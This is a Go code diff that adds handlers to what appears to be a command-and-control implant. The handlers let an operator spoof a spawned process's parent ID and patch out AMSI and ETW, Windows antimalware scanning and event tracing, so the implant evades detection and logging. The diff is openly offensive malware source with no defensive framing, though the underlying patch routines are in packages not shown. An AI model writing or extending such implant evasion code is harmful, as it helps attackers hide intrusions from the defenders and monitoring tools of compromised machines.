@@ -9,8 +9,41 @@ import (
 	"strings"
 	"time"
 
+	"github.com/azizbinmohammad/private-c2/implant/evasion/patch"
+	"github.com/azizbinmohammad/private-c2/implant/evasion/spawn"
 	"github.com/azizbinmohammad/private-c2/implant/evasion/stealth"
 )
+
+func handleEvasionPPIDSpoof(_ context.Context, args string) (string, error) {
+	var req struct {
+		Command   string `json:"command"`
+		ParentPID uint32 `json:"parent_pid"`
+	}
+	if err := unmarshalArgs(args, &req); err != nil {
+		return "", fmt.Errorf("evasion_ppid_spoof args must be JSON: %w", err)
+	}
+	result, err := spawn.SpoofParent(req.Command, req.ParentPID)
+	if err != nil {
+		return "", err
+	}
+	return marshalJSON(result)
+}
+
+func handleEvasionAMSI(_ context.Context, _ string) (string, error) {
+	result, err := patch.AMSI()
+	if err != nil {
+		return "", err
+	}
+	return marshalJSON(result)
+}
+
+func handleEvasionETW(_ context.Context, _ string) (string, error) {
+	result, err := patch.ETW()
+	if err != nil {
+		return "", err
+	}
+	return marshalJSON(result)
+}
 
 type timestompRequest struct {
 	Path      string `json:"path"`
